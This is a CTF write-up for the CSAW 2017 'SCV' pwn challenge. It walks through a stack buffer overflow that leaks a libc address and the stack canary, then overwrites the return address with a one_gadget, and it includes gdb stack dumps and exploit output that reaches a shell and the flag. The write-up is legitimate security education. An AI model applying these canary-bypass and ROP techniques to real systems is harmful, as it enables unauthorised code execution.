---
title: "CSAW - SCV (100pt)"
description: "Buffer overflow with cookie sniffing"
date: 2017-09-19
tags: ["exploit"]
---

# SCV (100pt)

**`Exploitation`**

**Files:**

* [scv](/code/2017/csaw/scv)
* [scv_libc](/code/2017/csaw/scv_libc)
* Exploit script: [solveSCV.py](/code/2017/csaw/solveSCV.py)

# Summary

At first glance, this looks like a simple buffer overflow ROP attack.
However, in order to reach the return address, you must overwrite a stack canary that will trigger an exception.

In order to perform the attack, you have to leak the stack cookie so that you can replace it during the full overwrite.

# Exploit

The buffer overflow occurs here:

```x86asm
0000000000400cba         lea        rax, qword [rbp+var_B0]
0000000000400cc1         mov        edx, 0xf8                                   ; argument "nbyte" for method j_read
0000000000400cc6         mov        rsi, rax                                    ; argument "buf" for method j_read
0000000000400cc9         mov        edi, 0x0                                    ; argument "fildes" for method j_read
0000000000400cce         call       j_read
```

The call to `j_read` reads up to `0xf8` into a buffer on the stack allowing for an overflow.

If we examine the stack in gdb, we see the following:

```
(gdb) x/24gx $rsi
0x7fffffffe480:	0x0000000000400930	0x00007ffff7dd4ac0
0x7fffffffe490:	0x00007ffff7dc9780	0x0000000000400930
0x7fffffffe4a0:	0x0000000000602080	0x00007ffff76c6299
0x7fffffffe4b0:	0x0000000000000001	0x00007fffffffe4e0
0x7fffffffe4c0:	0x0000000000601df8	0x0000000000400e1b
0x7fffffffe4d0:	0x0000000000000000	0x000000010000ffff
0x7fffffffe4e0:	0x00007fffffffe4f0	0x0000000000400e31
0x7fffffffe4f0:	0x0000000000000002	0x0000000000400e8d
0x7fffffffe500:	0x00ff000000000000	0x0000000000000000
0x7fffffffe510:	0x0000000000400e40	0x00000000004009a0
0x7fffffffe520:	0x00007fffffffe610	0xe60f91baa684cd00
0x7fffffffe530:	0x0000000000400e40	0x00007ffff76ac830
```

The region from `0x7fffffffe480` to `0x7fffffffe520` is the buffer we are writing to. Before we have written to it, it's filled with semi-random stack data.

At address `0x7fffffffe528` we see the value `0xe60f91baa684cd00` – the stack canary. Notice how the LSB of this value is a null byte. That is intended to prevent accidental leakage of the canary with string methods (since strings are traditionally null terminated).

After that we see the typical stored base pointer and return address.

# Step 1: Leak a libc pointer

The buffer is initially filled with old addresses from execution that happens before our `main` subroutine gets control. Some of those values will vary run to run but hopefully we can find a libc pointer that appears to stay constant (relative to libc base).

I found that the value at `&buff + 40` was sufficient to leak the libc base.

In order to read this value, we must first fill up the buffer with non-null bytes up to the value we want to read. After doing this, the stack looks like this:

```
(gdb) x/24gx $rsi
0x7fffffffe480:	0x6161616161616161	0x6161616161616161
0x7fffffffe490:	0x6161616161616161	0x6161616161616161
0x7fffffffe4a0:	0x0a61616161616161	0x00007ffff76c6299
0x7fffffffe4b0:	0x0000000000000001	0x00007fffffffe4e0
0x7fffffffe4c0:	0x0000000000601df8	0x0000000000400e1b
0x7fffffffe4d0:	0x0000000000000000	0x000000010000ffff
0x7fffffffe4e0:	0x00007fffffffe4f0	0x0000000000400e31
0x7fffffffe4f0:	0x0000000000000002	0x0000000000400e8d
0x7fffffffe500:	0x00ff000000000000	0x0000000000000000
0x7fffffffe510:	0x0000000000400e40	0x00000000004009a0
0x7fffffffe520:	0x00007fffffffe610	0xe60f91baa684cd00
0x7fffffffe530:	0x0000000000400e40	0x00007ffff76ac830
```

*Note: to write 40 bytes, we actually write 39 bytes ('a' in this case) plus a newline*

After this, we can print out the buffer and the stack address will be printed out after our 'a's.

# Step 2: Leak the stack cookie

In the same way, we can read the stack cookie by writing non-null bytes up to the start. However, we must take into consideration that the stack cookie starts with a null byte. 

Therefore, we will actually write one more additional byte over the LSB of the stack cookie and just remember that it starts with a null byte when we decode it.

*Note: even though we are overwriting the stack cookie, we don't trigger an exception here because we are inside a loop that won't return until we tell it to.*

For this part of the overwrite, our stack looks like this:

```
(gdb) x/24gx $rsi
0x7ffe3c32a890:	0x6161616161616161	0x6161616161616161
0x7ffe3c32a8a0:	0x6161616161616161	0x6161616161616161
0x7ffe3c32a8b0:	0x6161616161616161	0x6161616161616161
0x7ffe3c32a8c0:	0x6161616161616161	0x6161616161616161
0x7ffe3c32a8d0:	0x6161616161616161	0x6161616161616161
0x7ffe3c32a8e0:	0x6161616161616161	0x6161616161616161
0x7ffe3c32a8f0:	0x6161616161616161	0x6161616161616161
0x7ffe3c32a900:	0x6161616161616161	0x6161616161616161
0x7ffe3c32a910:	0x6161616161616161	0x6161616161616161
0x7ffe3c32a920:	0x6161616161616161	0x6161616161616161
0x7ffe3c32a930:	0x6161616161616161	0xb91f46933007280a
0x7ffe3c32a940:	0x0000000000400e40	0x00007ff5e1c48830
```

At this point, the stack cookie is corrupted. Therefore we must return it to normal when we overwrite the return address.

# Step 3: Careful overwrite

Now we perform a ROP attack to overwrite the return address with a magic gadget (found by one_gadget).

After that overwrite our stack looks like:

```
(gdb) x/24gx $rsi
0x7ffe3c32a890:	0x6161616161616161	0x6161616161616161
0x7ffe3c32a8a0:	0x6161616161616161	0x6161616161616161
0x7ffe3c32a8b0:	0x6161616161616161	0x6161616161616161
0x7ffe3c32a8c0:	0x6161616161616161	0x6161616161616161
0x7ffe3c32a8d0:	0x6161616161616161	0x6161616161616161
0x7ffe3c32a8e0:	0x6161616161616161	0x6161616161616161
0x7ffe3c32a8f0:	0x6161616161616161	0x6161616161616161
0x7ffe3c32a900:	0x6161616161616161	0x6161616161616161
0x7ffe3c32a910:	0x6161616161616161	0x6161616161616161
0x7ffe3c32a920:	0x6161616161616161	0x6161616161616161
0x7ffe3c32a930:	0x6161616161616161	0xb91f469330072800
0x7ffe3c32a940:	0x6262626262626262	0x00007ff5e1d19117
```

Notice that our stack cookie has been un-corrupted and we now are pointing to a different point in libc.

```
python solveSCV.py
[+] Opening connection to pwn.chal.csaw.io on port 3764: Done
libc base: 0x7f1c7fdf2000
cookie: 001dccec0249d35b
[*] Switching to interactive mode
[*]BYE ~ TIME TO MINE MIENRALS...
$ cat flag
flag{sCv_0n1y_C0st_50_M!n3ra1_tr3at_h!m_we11}
```